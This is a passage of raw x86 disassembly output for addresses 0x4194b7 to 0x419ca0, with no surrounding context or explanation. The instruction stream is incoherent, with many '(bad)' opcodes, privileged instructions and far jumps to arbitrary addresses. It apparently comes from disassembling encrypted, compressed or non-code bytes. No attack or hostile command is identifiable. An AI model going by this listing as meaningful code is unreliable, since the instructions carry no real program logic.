  4194b7:	ret    
  4194b8:	(bad)  
  4194b9:	lock pop esp
  4194bb:	in     al,0x50
  4194bd:	stc    
  4194be:	data16 mov ch,0x27
  4194c1:	mov    al,ds:0xa82bd24c
  4194c6:	ja     0x41945b
  4194c8:	outs   dx,DWORD PTR ds:[esi]
  4194c9:	pop    es
  4194ca:	dec    esp
  4194cb:	(bad)  
  4194cf:	xchg   edi,eax
  4194d0:	int    0xd
  4194d2:	jg     0x419546
  4194d4:	call   DWORD PTR [edi+edx*2+0x6e]
  4194d8:	fidivr DWORD PTR [ebp-0x2c]
  4194db:	xchg   esi,ebx
  4194dd:	icebp  
  4194de:	pop    ds
  4194df:	lods   ax,WORD PTR ds:[esi]
  4194e1:	int    0x5d
  4194e3:	xchg   edx,eax
  4194e4:	mov    esi,0x57277d4c
  4194e9:	adc    DWORD PTR [esi-0x2924d74c],edi
  4194ef:	pop    edx
  4194f0:	push   0xfffffff2
  4194f2:	xor    edi,DWORD PTR [edx+0x52]
  4194f5:	jl     0x419508
  4194f7:	xor    eax,0xf5dd1806
  4194fc:	sbb    DWORD PTR [ecx+0x5b],ebp
  4194ff:	bound  bx,DWORD PTR [edx-0x5a00627a]
  419506:	mov    dh,0xfb
  419508:	inc    ebx
  419509:	lods   eax,DWORD PTR ds:[esi]
  41950a:	mov    dh,0x2d
  41950c:	and    eax,0x6b60979a
  419511:	hlt    
  419512:	dec    ecx
  419513:	mov    dl,0x66
  419515:	aad    0x88
  419517:	nop    DWORD PTR [ebp-0x1c33bb1f]
  41951e:	xor    ch,dh
  419520:	cdq    
  419521:	lods   eax,DWORD PTR ds:[esi]
  419522:	fs pusha 
  419524:	cdq    
  419525:	in     al,dx
  419526:	adc    DWORD PTR [ecx+0x23],esi
  419529:	inc    ecx
  41952a:	stc    
  41952b:	aaa    
  41952c:	push   cs
  41952d:	rol    dh,cl
  41952f:	xor    DWORD PTR [eax+0x50],esi
  419532:	rol    BYTE PTR [esi],0x2e
  419535:	jo     0x4195ae
  419537:	mov    ebp,0x3eef15f6
  41953c:	pop    es
  41953d:	and    al,0xf2
  41953f:	into   
  419540:	mov    ebx,cs
  419542:	push   esi
  419543:	push   edx
  419544:	fs push es
  419546:	fst    st(5)
  419548:	or     ebx,DWORD PTR [edx+eax*2]
  41954b:	call   0x3ac700cc
  419550:	mov    eax,0x502fbf61
  419555:	and    dl,BYTE PTR gs:[eax]
  419558:	aaa    
  419559:	retf   
  41955a:	shl    dh,0x40
  41955d:	xor    DWORD PTR [edx+eax*2],ecx
  419560:	leave  
  419561:	outs   dx,DWORD PTR ds:[esi]
  419562:	dec    eax
  419563:	rcl    DWORD PTR [ecx+0x2d],1
  419566:	mov    ds:0xaa0622bf,eax
  41956b:	idiv   BYTE PTR [eax]
  41956d:	sub    bl,ah
  41956f:	in     eax,dx
  419570:	ds std 
  419572:	(bad)
  419576:	dec    esp
  419577:	imul   esp,DWORD PTR [esi-0x2b8d6f4f],0x6d
  41957e:	and    edi,0x659b82e2
  419584:	icebp  
  419585:	sub    DWORD PTR [ecx-0x33],0x70cee185
  41958c:	aas    
  41958d:	push   edi
  41958e:	repnz fdivr st,st(3)
  419592:	add    edx,esp
  419594:	loopne 0x4195ed
  419596:	retf   
  419597:	arpl   WORD PTR [edx],bp
  419599:	test   BYTE PTR [ecx-0x12ecb415],0xed
  4195a0:	loope  0x4195bd
  4195a2:	mov    edi,0x1925c4e0
  4195a7:	mov    bh,0x3
  4195a9:	retf   0xbba6
  4195ac:	adc    eax,0x125e2067
  4195b1:	leave  
  4195b2:	cli    
  4195b3:	xchg   esp,eax
  4195b4:	jnp    0x4195d2
  4195b6:	sub    bl,BYTE PTR [ecx-0xa]
  4195b9:	xchg   BYTE PTR [edx+0x29],bh
  4195bc:	jl     0x4195e6
  4195be:	inc    eax
  4195bf:	repz or al,0xfb
  4195c2:	sub    BYTE PTR [eax],0xad
  4195c5:	retf   
  4195c6:	cmp    BYTE PTR ds:0x62b16596,al
  4195cc:	push   ecx
  4195cd:	retf   0x75c6
  4195d0:	daa    
  4195d1:	pop    eax
  4195d2:	cmp    edi,esi
  4195d4:	sbb    BYTE PTR [ebp-0x2a94e369],bh
  4195da:	sub    DWORD PTR [edi],0xffffffc0
  4195dd:	pop    ebp
  4195de:	aam    0x91
  4195e0:	test   BYTE PTR gs:[bx+si],0x78
  4195e5:	scas   al,BYTE PTR es:[edi]
  4195e6:	rol    esp,cl
  4195e8:	sti    
  4195e9:	cmp    ebx,ebx
  4195eb:	push   0xa2b8a1a7
  4195f0:	inc    edx
  4195f1:	in     al,dx
  4195f2:	aad    0xf9
  4195f4:	rcl    BYTE PTR [edx],cl
  4195f6:	sub    al,0x94
  4195f8:	rol    edi,0x9c
  4195fb:	inc    edi
  4195fc:	lahf   
  4195fd:	fld    DWORD PTR [ebx]
  4195ff:	push   0xc2036a2c
  419604:	push   ebp
  419605:	pop    edx
  419606:	mov    dh,0x1c
  419608:	push   edx
  419609:	xchg   ecx,eax
  41960a:	(bad)  [ebx]
  41960c:	shl    BYTE PTR [edi-0x14],cl
  41960f:	sbb    al,0xd4
  419611:	(bad)  
  419612:	push   cs
  419613:	out    dx,eax
  419614:	cmp    eax,0xe6cf6dcf
  419619:	ret    0x8661
  41961c:	(bad)  [ebx-0x34]
  41961f:	inc    edi
  419620:	jmp    0x9238:0x33b74675
  419627:	cmp    DWORD PTR [edi-0x4156b148],ebx
  41962d:	aad    0x55
  41962f:	jb     0x419661
  419631:	mov    ebx,0x3c7cd90f
  419636:	xlat   BYTE PTR ds:[ebx]
  419637:	xor    bl,BYTE PTR [ecx+0x26]
  41963a:	jbe    0x419657
  41963c:	mov    ecx,DWORD PTR [ebp+0x509777db]
  419642:	mov    esi,0xc0e17724
  419647:	loopne 0x4195e9
  419649:	and    eax,0x55478cad
  41964e:	cld    
  41964f:	xchg   ebx,eax
  419650:	push   esi
  419651:	sub    eax,0x1cc403e8
  419657:	mov    bl,0x16
  419659:	shl    BYTE PTR [edx+edx*2+0x427fa2a1],cl
  419660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419661:	jno    0x419616
  419663:	jecxz  0x4196d5
  419665:	(bad)  
  419666:	fcom   st(6)
  419668:	cli    
  419669:	out    0x96,eax
  41966b:	jle    0x41968b
  41966d:	mov    ch,0xe5
  41966f:	xlat   BYTE PTR ds:[ebx]
  419670:	lahf   
  419671:	push   edx
  419672:	out    0x46,al
  419674:	xor    edi,DWORD PTR [eax+0x71117d7d]
  41967a:	sub    eax,0x828b397d
  41967f:	add    BYTE PTR [ebp-0x2d617938],bh
  419685:	aad    0xb5
  419687:	mov    DWORD PTR [eax-0x6b0c56d2],ebp
  41968d:	add    bh,ah
  41968f:	jl     0x4196d6
  419691:	popf   
  419692:	push   ebp
  419693:	and    eax,0x5988c5ad
  419698:	dec    ecx
  419699:	cwde   
  41969a:	in     al,0xf3
  41969c:	mov    edx,0xdf4611c5
  4196a1:	mov    ah,0x15
  4196a3:	pusha  
  4196a4:	dec    esi
  4196a5:	inc    eax
  4196a6:	add    cl,BYTE PTR [ecx+0x6]
  4196a9:	pop    ecx
  4196aa:	popf   
  4196ab:	or     eax,DWORD PTR [ecx-0xb3e5bbf]
  4196b1:	test   DWORD PTR ds:0x4bc3f367,0xebd23a88
  4196bb:	hlt    
  4196bc:	stos   DWORD PTR es:[edi],eax
  4196bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196be:	add    ebp,ecx
  4196c0:	sub    eax,0xe35ab472
  4196c5:	pop    edi
  4196c6:	icebp  
  4196c7:	aad    0x1b
  4196c9:	cdq    
  4196ca:	sbb    ebp,DWORD PTR [edx]
  4196cc:	mov    ds:0x946e9a6f,al
  4196d1:	cs pop esi
  4196d3:	sbb    eax,DWORD PTR [edx+eax*2]
  4196d6:	jp     0x419674
  4196d8:	mov    DWORD PTR [edx-0x73],eax
  4196db:	pushf  
  4196dc:	xchg   edi,eax
  4196dd:	sbb    eax,0x57665231
  4196e2:	push   eax
  4196e3:	gs inc edi
  4196e5:	call   0x4d48:0xc9eac60a
  4196ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196ed:	mov    al,0x17
  4196ef:	shl    BYTE PTR [eax-0x1f47408f],0xbd
  4196f6:	inc    edi
  4196f7:	js     0x41976c
  4196f9:	pop    esi
  4196fa:	retf   0x63fe
  4196fd:	sub    al,0xd9
  4196ff:	and    eax,0x89ffa500
  419704:	adc    bl,BYTE PTR [ebx+0x25]
  419707:	hlt    
  419708:	jb     0x41977d
  41970a:	push   es
  41970b:	int3   
  41970c:	pop    esi
  41970d:	hlt    
  41970e:	mov    ah,al
  419710:	pop    eax
  419711:	mov    esp,0x767281bc
  419716:	mov    BYTE PTR [esi+0x6eece128],al
  41971c:	ret    
  41971d:	ins    BYTE PTR es:[edi],dx
  41971e:	(bad)  
  41971f:	and    BYTE PTR [edi],dh
  419721:	mov    esi,0xcd1064dc
  419726:	ret    
  419727:	cld    
  419728:	xchg   ecx,eax
  419729:	dec    eax
  41972a:	test   BYTE PTR [eax],al
  41972c:	or     eax,0x5c9ef7b0
  419731:	adc    al,0x59
  419733:	call   0x618:0x3e1b6fe3
  41973a:	xor    eax,0x4491ba6a
  41973f:	jp     0x41971a
  419741:	sub    edi,ebx
  419743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419744:	fcomip st,st(2)
  419746:	data16 jmp 0x419790
  419749:	push   es
  41974a:	cmp    DWORD PTR [esi],edx
  41974c:	fidivr WORD PTR ds:0x57893e53
  419752:	ror    BYTE PTR [edi],0x64
  419755:	int3   
  419756:	xor    BYTE PTR [ecx],dh
  419758:	push   0xffffff87
  41975a:	fnsave [edx-0x3275948d]
  419760:	in     eax,0x7b
  419762:	push   cs
  419763:	shl    DWORD PTR [edx+edx*4],0x94
  419767:	xchg   esp,eax
  419768:	outs   dx,BYTE PTR ds:[esi]
  419769:	rcl    BYTE PTR [eax],0x75
  41976c:	mov    ch,0xed
  41976e:	fdivrp st(2),st
  419770:	xor    al,0x54
  419772:	xor    eax,0xe2637ec7
  419777:	jnp    0x419729
  419779:	mov    edx,0x1ec632e7
  41977e:	adc    BYTE PTR [ebx],bh
  419780:	aad    0xaa
  419782:	mov    cl,0x1b
  419784:	pop    esi
  419785:	mov    bh,0x51
  419787:	push   eax
  419788:	leave  
  419789:	std    
  41978a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41978b:	popa   
  41978c:	ja     0x419797
  41978e:	jo     0x41973b
  419790:	lods   al,BYTE PTR ds:[esi]
  419791:	mov    bl,0xfe
  419793:	pop    es
  419794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419795:	sub    al,0x20
  419797:	scas   al,BYTE PTR es:[edi]
  419798:	pop    es
  419799:	iret   
  41979a:	add    al,0x51
  41979c:	dec    esi
  41979d:	xchg   BYTE PTR [edi],bh
  41979f:	loop   0x4197b6
  4197a1:	sub    eax,esi
  4197a3:	mov    eax,ds:0x8b200e59
  4197a8:	sub    al,0x54
  4197aa:	mov    esp,DWORD PTR [ecx]
  4197ac:	in     eax,0x98
  4197ae:	add    eax,0xc1a125d9
  4197b3:	xchg   BYTE PTR [ecx+0x6f],bh
  4197b6:	adc    edx,DWORD PTR [edx]
  4197b8:	mov    ch,0xa5
  4197ba:	xchg   ebp,eax
  4197bb:	and    al,0x91
  4197bd:	jo     0x419834
  4197bf:	xchg   ecx,eax
  4197c0:	(bad)  
  4197c1:	fs imul ebp,ebx,0xaf96419e
  4197c8:	je     0x41977f
  4197ca:	inc    eax
  4197cb:	hlt    
  4197cc:	or     eax,0xfe389a4f
  4197d1:	xor    al,BYTE PTR [ebx]
  4197d3:	sub    DWORD PTR [ebx+0x9],0x4b211312
  4197da:	add    BYTE PTR [edi-0x65],0x5b
  4197de:	mov    al,0x9c
  4197e0:	jmp    0x6ad39352
  4197e5:	not    DWORD PTR [edi+0x7b]
  4197e8:	adc    eax,0xa1cfbd75
  4197ed:	lea    edi,[edx-0x62fbc28a]
  4197f3:	mov    esp,0xfcebaf24
  4197f8:	xor    eax,0xbee4e87b
  4197fd:	cmp    DWORD PTR [edx],ebp
  4197ff:	pop    es
  419800:	cmc    
  419801:	repz add BYTE PTR [ebx-0xb],dh
  419805:	push   0xf4c8f2fb
  41980a:	and    eax,0x11b4713e
  41980f:	jae    0x419794
  419811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419812:	popa   
  419813:	mov    eax,0xcd604e98
  419818:	and    al,0x5c
  41981a:	hlt    
  41981b:	mov    edx,0x8097055a
  419820:	xbegin 0xdbcfa4fa
  419826:	(bad)  
  419827:	xchg   BYTE PTR ss:[esi+0x5f],dh
  41982b:	(bad)  
  41982c:	imul   ebx,DWORD PTR [edi],0x5e
  41982f:	ins    BYTE PTR es:[edi],dx
  419830:	xor    eax,0x4878b52a
  419835:	or     bh,dh
  419837:	imul   eax,DWORD PTR fs:[esp+esi*1-0x3e],0x234fcf9f
  419840:	lds    esp,FWORD PTR [ebx+0x1c]
  419843:	lods   al,BYTE PTR ds:[esi]
  419844:	push   ebp
  419845:	adc    dl,ah
  419847:	cli    
  419848:	pop    edi
  419849:	xchg   edi,eax
  41984a:	mov    ch,0x6b
  41984c:	and    eax,0x8cfdc7c7
  419851:	xchg   esp,eax
  419852:	test   BYTE PTR [esi-0x15785342],ch
  419858:	pop    esp
  419859:	pop    ebp
  41985a:	sahf   
  41985b:	into   
  41985c:	aad    0x53
  41985e:	adc    al,0x83
  419860:	lea    edi,[ebx]
  419862:	nop
  419863:	ins    BYTE PTR es:[edi],dx
  419864:	mov    sp,0xd649
  419868:	and    al,0x39
  41986a:	adc    BYTE PTR [edi+0x5ffc0544],bl
  419870:	retf   0x5b14
  419873:	and    eax,DWORD PTR [esp+ebp*1]
  419876:	inc    esp
  419877:	fisub  WORD PTR [edi-0x7d]
  41987a:	scas   al,BYTE PTR es:[edi]
  41987b:	js     0x41986c
  41987d:	(bad)  
  41987e:	stc    
  41987f:	pop    ecx
  419880:	jle    0x419814
  419882:	(bad)  
  419883:	(bad)  
  419884:	mov    cs,WORD PTR [esi-0x66]
  419887:	mov    al,0xd1
  419889:	test   al,0x62
  41988b:	xor    eax,0x17600ec4
  419890:	xor    al,0x0
  419892:	jno    0x4198a3
  419894:	push   ss
  419895:	push   cs
  419896:	je     0x419833
  419898:	loope  0x4198de
  41989a:	xchg   edi,eax
  41989b:	in     eax,dx
  41989c:	and    bl,al
  41989e:	arpl   WORD PTR [esi+ebx*4],bp
  4198a1:	div    DWORD PTR [ecx-0x232f5a4]
  4198a7:	and    eax,0xddad210
  4198ac:	outs   dx,DWORD PTR ds:[esi]
  4198ad:	(bad)  
  4198ae:	aas    
  4198af:	mov    ds:0x48ca967c,al
  4198b4:	arpl   sp,ax
  4198b6:	sbb    al,0xc7
  4198b8:	stos   DWORD PTR es:[edi],eax
  4198b9:	dec    ebp
  4198ba:	iret   
  4198bb:	sahf   
  4198bc:	xchg   ebp,eax
  4198bd:	add    BYTE PTR [edi+0x67],bh
  4198c0:	and    BYTE PTR [esi-0x125620ff],dl
  4198c6:	nop    DWORD PTR [ebp+0x69]
  4198ca:	mov    ebp,0x706c4b84
  4198cf:	loop   0x41993f
  4198d1:	rdpmc  
  4198d3:	int    0xcf
  4198d5:	mov    db0,edx
  4198d8:	arpl   ax,bp
  4198da:	jno    0x41986f
  4198dc:	test   al,0xa3
  4198de:	and    ecx,DWORD PTR [ecx+edi*2]
  4198e1:	(bad)  
  4198e2:	xchg   edi,eax
  4198e3:	mov    dl,al
  4198e5:	mov    DWORD PTR [edi+0x4d],0x165736b6
  4198ec:	enter  0xef1,0xe4
  4198f0:	xchg   DWORD PTR [edi-0x389265f2],eax
  4198f6:	cmp    BYTE PTR [edx+0xf],0xab
  4198fa:	xchg   ebp,eax
  4198fb:	xchg   ecx,eax
  4198fc:	xchg   ebp,eax
  4198fd:	inc    ebx
  4198fe:	jl     0x4198a4
  419900:	shl    DWORD PTR [ebx+0x66ca5512],1
  419906:	les    esi,FWORD PTR [eax+0x469d07f3]
  41990c:	ficomp DWORD PTR [edi]
  41990e:	mov    dh,0x3e
  419910:	scas   al,BYTE PTR es:[edi]
  419911:	or     ah,BYTE PTR [esi]
  419913:	cmp    DWORD PTR [ebx+0x2050f41e],edx
  419919:	mov    edi,0x159afe4b
  41991e:	pop    ebx
  41991f:	jno    0x41992f
  419921:	adc    dl,BYTE PTR [edx+0x12]
  419924:	dec    esi
  419925:	jg     0x41991c
  419927:	dec    ebx
  419928:	add    bl,bh
  41992a:	(bad)
  41992d:	in     al,0xe5
  41992f:	mov    dh,0x7d
  419931:	(bad)  
  419932:	pop    ebp
  419933:	ds je  0x419905
  419936:	repnz push edi
  419938:	jno    0x41994f
  41993a:	mov    WORD PTR [ecx],ss
  41993c:	icebp  
  41993d:	out    dx,eax
  41993e:	dec    edx
  41993f:	sbb    al,0x25
  419941:	push   ebp
  419942:	lods   eax,DWORD PTR ds:[esi]
  419943:	iret   
  419944:	je     0x4198c8
  419946:	jecxz  0x4198c8
  419948:	and    BYTE PTR [esi+0x42],0xc3
  41994c:	mov    esi,0x725dcae3
  419951:	xor    eax,0x75c71780
  419956:	cmp    eax,0x3446744d
  41995b:	call   0x1c88:0x8e2fa9e0
  419962:	dec    ecx
  419963:	add    dl,cl
  419965:	clc    
  419966:	data16 fadd QWORD PTR [eax]
  419969:	pop    ecx
  41996a:	xchg   esi,eax
  41996b:	sbb    al,0xee
  41996d:	jo     0x41994a
  41996f:	adc    BYTE PTR [eax+0x20499d57],ch
  419975:	pusha  
  419976:	jmp    0x4199ec
  419978:	(bad)
  41997b:	pop    esi
  41997c:	jge    0x41997e
  41997e:	mov    ch,BYTE PTR [eax+0x6a6a957a]
  419984:	add    eax,0xe279735b
  419989:	fadd   st,st(1)
  41998b:	pop    es
  41998c:	pop    esi
  41998d:	mov    bh,BYTE PTR [ebx-0x3cfdccf9]
  419993:	call   0xd892dfee
  419998:	push   cs
  419999:	push   ebp
  41999a:	or     eax,0x19ac4e1
  41999f:	push   esi
  4199a0:	mov    BYTE PTR [ebp-0x6f],ch
  4199a3:	(bad)  
  4199a4:	and    ebp,DWORD PTR [ebp+eax*4-0x3f]
  4199a8:	(bad)  
  4199a9:	leave  
  4199aa:	dec    edx
  4199ab:	test   DWORD PTR [edx-0x30],0xf57b696d
  4199b2:	fcmovu st,st(2)
  4199b4:	sub    edx,0xffffffab
  4199b7:	mov    esi,0x719e703f
  4199bc:	xchg   DWORD PTR [ebp+0x5a],edx
  4199bf:	mov    dl,0x7c
  4199c1:	cs push edi
  4199c3:	shr    cl,1
  4199c5:	push   0x6275f62b
  4199ca:	or     DWORD PTR [esi+ebp*2-0x3f],ebx
  4199ce:	jle    0x4199ee
  4199d0:	mov    al,ds:0xca1915e6
  4199d5:	outs   dx,DWORD PTR ds:[esi]
  4199d6:	daa    
  4199d7:	pop    es
  4199d8:	jb     0x41998c
  4199da:	cmp    BYTE PTR ds:[ebx-0x49acf468],dl
  4199e1:	test   DWORD PTR [ecx-0x15],edi
  4199e4:	(bad)  
  4199e5:	sub    al,0xa1
  4199e7:	lds    esi,FWORD PTR [edx]
  4199e9:	(bad)  
  4199ea:	or     al,0x62
  4199ec:	jle    0x419a64
  4199ee:	ret    0x37e
  4199f1:	dec    esp
  4199f2:	mov    ebx,0x504cf18
  4199f7:	hlt    
  4199f8:	xchg   edi,eax
  4199f9:	add    al,BYTE PTR [esi+ecx*2]
  4199fc:	mov    DWORD PTR [ecx-0x17e0f909],ecx
  419a02:	hlt    
  419a03:	mov    dl,0xca
  419a05:	sbb    ah,BYTE PTR [esi]
  419a07:	lahf   
  419a08:	stc    
  419a09:	dec    esp
  419a0a:	nop
  419a0b:	repnz sar BYTE PTR [ebp-0xf],0x8a
  419a10:	out    dx,eax
  419a11:	push   edi
  419a12:	cmp    BYTE PTR [edx-0x25],0x89
  419a16:	add    BYTE PTR [esi-0x4d],ah
  419a19:	inc    edi
  419a1a:	mov    esi,0xabe275ba
  419a1f:	test   al,0x52
  419a21:	les    edi,FWORD PTR [edi]
  419a23:	xchg   edx,eax
  419a24:	lods   al,BYTE PTR ds:[esi]
  419a25:	div    DWORD PTR [eax-0x1c]
  419a28:	loopne 0x4199f9
  419a2a:	push   es
  419a2b:	mov    ds:0x4ca54eea,eax
  419a30:	leave  
  419a31:	mov    ah,0x2a
  419a33:	adc    al,0x99
  419a35:	pop    esp
  419a36:	pop    ecx
  419a37:	or     esp,eax
  419a39:	mov    BYTE PTR [edx-0x3e],dh
  419a3c:	pushf  
  419a3d:	test   eax,0x912fd7ad
  419a42:	sub    edx,edi
  419a44:	lock iret 
  419a46:	imul   edx,DWORD PTR [esi],0x748a064a
  419a4c:	xchg   ebp,eax
  419a4d:	in     al,0x0
  419a4f:	jg     0x4199f2
  419a51:	sub    ah,0x46
  419a54:	xchg   esp,eax
  419a55:	xor    al,0x45
  419a57:	sbb    cl,BYTE PTR [edx+0x581b40ce]
  419a5d:	adc    DWORD PTR [edi+0x7c],0x191c4ee1
  419a64:	adc    BYTE PTR [esi],ah
  419a66:	mov    ds:0x9f9af3b3,eax
  419a6b:	bound  ebp,QWORD PTR [edi+0x7d]
  419a6e:	sbb    ebx,DWORD PTR [ecx]
  419a70:	push   ebx
  419a71:	push   eax
  419a72:	add    DWORD PTR [esi-0x17af02b7],ebp
  419a78:	cmp    ebx,esp
  419a7a:	sub    esp,ebx
  419a7c:	or     eax,0x610dbe2e
  419a81:	dec    edx
  419a82:	sub    ebx,esi
  419a84:	fcmovnu st,st(6)
  419a86:	outs   dx,BYTE PTR ds:[esi]
  419a87:	mov    bh,0x13
  419a89:	pop    esi
  419a8a:	xor    ch,ch
  419a8c:	(bad)  
  419a8d:	jne    0x419ac7
  419a8f:	into   
  419a90:	leave  
  419a91:	jb     0x419a51
  419a93:	imul   esi,DWORD PTR [edx],0x64efc551
  419a99:	sbb    bh,BYTE PTR [esi+0x5e]
  419a9c:	ror    esp,cl
  419a9e:	push   eax
  419a9f:	(bad)  
  419aa0:	adc    BYTE PTR [ebp-0x150fb805],ch
  419aa6:	mov    ebx,0x86dc624
  419aab:	pop    ds
  419aac:	nop
  419aad:	imul   eax,DWORD PTR [ebx+0x78],0xffffffe5
  419ab1:	mov    dl,0x11
  419ab3:	pop    ds
  419ab4:	mov    esp,0x1243288e
  419ab9:	add    al,BYTE PTR [edi-0x8a57fb3]
  419abf:	lods   al,BYTE PTR ds:[esi]
  419ac0:	aad    0x3f
  419ac2:	js     0x419ad8
  419ac4:	jno    0x419b37
  419ac6:	leave  
  419ac7:	popa   
  419ac8:	xchg   ebx,eax
  419ac9:	inc    edx
  419aca:	jne    0x419adc
  419acc:	cmp    eax,0xf0fb1f40
  419ad1:	or     BYTE PTR [ebp-0xf3bb398],al
  419ad7:	sbb    dh,al
  419ad9:	mov    ah,0x41
  419adb:	xor    eax,edx
  419add:	push   cs
  419ade:	xchg   esi,eax
  419adf:	mov    dl,0x3d
  419ae1:	fistp  DWORD PTR [edi+0x1ea097a5]
  419ae7:	sar    DWORD PTR [edi+0x2b21533a],1
  419aed:	stos   BYTE PTR es:[edi],al
  419aee:	enter  0xf7a,0x37
  419af2:	shr    DWORD PTR [esi-0x4c],cl
  419af5:	jns    0x419b71
  419af7:	push   esi
  419af8:	sbb    eax,0x87bb01c4
  419afd:	xor    bl,bh
  419aff:	fsubrp st(5),st
  419b01:	(bad)  
  419b02:	stos   DWORD PTR es:[edi],eax
  419b03:	push   esi
  419b04:	jg     0x419ac0
  419b06:	sbb    ch,dh
  419b08:	sbb    esp,ecx
  419b0a:	test   ch,al
  419b0c:	jp     0x419b61
  419b0e:	in     eax,dx
  419b0f:	test   al,0xbb
  419b11:	ret    0x98ee
  419b14:	xchg   edi,eax
  419b15:	or     bh,BYTE PTR [edi-0x39]
  419b18:	cld    
  419b19:	push   edx
  419b1a:	outs   dx,BYTE PTR ds:[esi]
  419b1b:	and    al,0x3e
  419b1d:	test   BYTE PTR [eax],0x1d
  419b20:	inc    ebp
  419b21:	fstp   QWORD PTR [ebx-0x831ff2c]
  419b27:	aam    0x5f
  419b29:	sub    eax,DWORD PTR [ebx]
  419b2b:	push   ebp
  419b2c:	mov    BYTE PTR [eax],al
  419b2e:	inc    esp
  419b2f:	fwait
  419b30:	sub    dl,BYTE PTR [ecx+0x4991c000]
  419b36:	lock retf 
  419b38:	cmp    BYTE PTR [ebx+0x318a567f],0x8a
  419b3f:	ja     0x419afe
  419b41:	mov    dl,dl
  419b43:	and    bl,ch
  419b45:	push   0xffffffd2
  419b47:	adc    DWORD PTR [edx+0x51],ebp
  419b4a:	loope  0x419af8
  419b4c:	push   0x454593e4
  419b51:	mov    edi,0xf61c2d5
  419b56:	mov    edx,0xe3b675af
  419b5b:	mov    ss,esi
  419b5d:	ins    DWORD PTR es:[edi],dx
  419b5e:	dec    esi
  419b5f:	iret   
  419b60:	cmp    edx,eax
  419b62:	shl    BYTE PTR [ebp-0x2360a14c],0x43
  419b69:	pop    edi
  419b6a:	out    0x6f,al
  419b6c:	fwait
  419b6d:	jge    0x419b0a
  419b6f:	cmp    ecx,DWORD PTR [ebx+0x7146577a]
  419b75:	sub    al,0x3e
  419b77:	pop    ecx
  419b78:	sub    DWORD PTR [edi],edx
  419b7a:	push   esi
  419b7b:	jae    0x419b75
  419b7d:	pop    eax
  419b7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b7f:	mov    bl,0x49
  419b81:	stc    
  419b82:	jecxz  0x419bee
  419b84:	enter  0xce85,0xef
  419b88:	sbb    eax,0x2118be36
  419b8d:	adc    ecx,DWORD PTR ds:0x866bbd47
  419b93:	jg     0x419b9b
  419b95:	jae    0x419c02
  419b97:	aam    0x2d
  419b99:	scas   al,BYTE PTR es:[edi]
  419b9a:	ror    DWORD PTR [esi],1
  419b9c:	xor    al,0x44
  419b9e:	(bad)  
  419b9f:	in     al,0x1f
  419ba1:	ja     0x419ba0
  419ba3:	retf   0x8311
  419ba6:	loope  0x419b6f
  419ba8:	shr    BYTE PTR [ebp-0x320a2b58],0xcb
  419baf:	add    DWORD PTR [edx],edx
  419bb1:	pop    ecx
  419bb2:	push   ebx
  419bb3:	mov    edx,0x23f2f28c
  419bb8:	inc    ebx
  419bb9:	les    edx,FWORD PTR [ebp+0x27]
  419bbc:	push   0xa96c4f8f
  419bc1:	cmc    
  419bc2:	in     eax,0xa0
  419bc4:	mov    esi,0xffc3f448
  419bc9:	ds pop ebp
  419bcb:	test   DWORD PTR [edi-0x3ccd5058],esi
  419bd1:	in     al,0x94
  419bd3:	dec    eax
  419bd4:	jb     0x419bca
  419bd6:	(bad)  
  419bd7:	pop    ss
  419bd8:	and    ch,BYTE PTR [esi+eiz*2]
  419bdb:	in     al,dx
  419bdc:	sbb    DWORD PTR [edi-0x1],edi
  419bdf:	int    0x4b
  419be1:	cwde   
  419be2:	sbb    esp,DWORD PTR ds:0xb9c0df3f
  419be8:	imul   edi,DWORD PTR [edx-0x5485f810],0x1701e952
  419bf2:	in     eax,0x1b
  419bf4:	jbe    0x419b87
  419bf6:	xchg   esi,eax
  419bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bf8:	mov    bl,bh
  419bfa:	sbb    DWORD PTR [esi+0x6840eb],edx
  419c00:	jmp    0x68b98b83
  419c05:	pop    edx
  419c06:	dec    DWORD PTR [edx-0xf]
  419c09:	adc    eax,0x8220c6b1
  419c0e:	and    edi,DWORD PTR [ebx]
  419c10:	jg     0x419c5a
  419c12:	inc    esp
  419c13:	dec    eax
  419c14:	cs mov esp,0x116d3fab
  419c1a:	int3   
  419c1b:	aaa    
  419c1c:	adc    DWORD PTR [eax+ebp*2+0x2],edi
  419c20:	(bad)  
  419c21:	scas   eax,DWORD PTR es:[edi]
  419c22:	dec    ebx
  419c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c24:	xor    DWORD PTR ds:0xc0b6a194,0xd5b8cb54
  419c2e:	cmc    
  419c2f:	scas   al,BYTE PTR es:[edi]
  419c30:	xor    cl,BYTE PTR [ebx+0x6]
  419c33:	sbb    dl,BYTE PTR [eax+0x5ad6e56]
  419c39:	mov    ebx,0x7fde07c0
  419c3e:	mov    bl,0xbc
  419c40:	push   esp
  419c41:	pushf  
  419c42:	xor    BYTE PTR [edi+0x56db31ca],ch
  419c48:	inc    esp
  419c49:	or     al,0x32
  419c4b:	adc    cl,al
  419c4d:	inc    ecx
  419c4f:	add    edi,edi
  419c51:	aaa    
  419c52:	dec    esp
  419c53:	mov    bl,BYTE PTR [edi]
  419c55:	fwait
  419c56:	xchg   ebp,eax
  419c57:	push   0x79bec500
  419c5c:	cmp    esp,eax
  419c5e:	imul   eax,DWORD PTR ds:0x92cc6b2b,0x5c85103
  419c68:	or     BYTE PTR ds:0x8ff98995,dl
  419c6e:	sahf   
  419c6f:	push   ss
  419c70:	jno    0x419c2f
  419c72:	pop    es
  419c73:	push   edi
  419c74:	xchg   DWORD PTR [ebp-0x66143e76],edx
  419c7a:	aas    
  419c7b:	xor    eax,0x54c2e1af
  419c80:	outs   dx,BYTE PTR ds:[esi]
  419c81:	and    BYTE PTR [ecx+0x1fb79781],ch
  419c87:	addr16 push dx
  419c8a:	rcl    DWORD PTR [edx],1
  419c8c:	push   ss
  419c8d:	pop    esp
  419c8e:	mov    esp,0xc841ce99
  419c93:	daa    
  419c94:	mov    ds:0xd1635117,eax
  419c99:	pop    ebx
  419c9a:	ret    
  419c9b:	xor    al,0xfd
  419c9d:	test   DWORD PTR [esi+0x5b],ebx
  419ca0:	fcom   st(5)
